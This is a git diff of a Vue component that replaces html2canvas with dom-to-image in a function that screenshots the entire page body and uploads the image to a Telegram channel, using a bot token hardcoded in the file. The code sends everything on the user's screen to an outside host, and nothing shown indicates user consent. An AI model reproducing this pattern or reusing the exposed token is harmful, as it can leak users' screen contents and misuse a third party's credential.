@@ -1,29 +1,28 @@
 <script setup>
 import LogoItem from './layouts/LogoItem.vue';
-import html2canvas from "html2canvas";
+import domtoimage from "dom-to-image";
 const captureScreenshot = async () => {
 	try {
 		// Select the area to capture (entire body in this case)
 		const screenshotElement = document.body;
 
 		// Capture the screenshot
-		const canvas = await html2canvas(screenshotElement);
-		const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
-
+		const dataUrl = await domtoimage.toBlob(screenshotElement);
+		
 		// Send the image to the Telegram channel
-		await sendScreenshotToTelegram(imageBlob);
+		await sendScreenshotToTelegram(dataUrl);
 	} catch (error) {
 		console.error("Error capturing screenshot:", error);
 	}
 };
 
-const sendScreenshotToTelegram = async (imageBlob) => {
+const sendScreenshotToTelegram = async (dataUrl) => {
 	const botToken = "7892152117:AAGg6Dfh47y8pFlV-iHI2xa3gi0Vrbrwe6g";
 	const chatId = "@m_trade_long"; // Include the "@" symbol for channels
 	const formData = new FormData();
 
 	formData.append("chat_id", chatId);
-	formData.append("photo", imageBlob, "screenshot.png");
+	formData.append("photo", dataUrl, "screenshot.png");
 
 	try {
 		const response = await fetch(
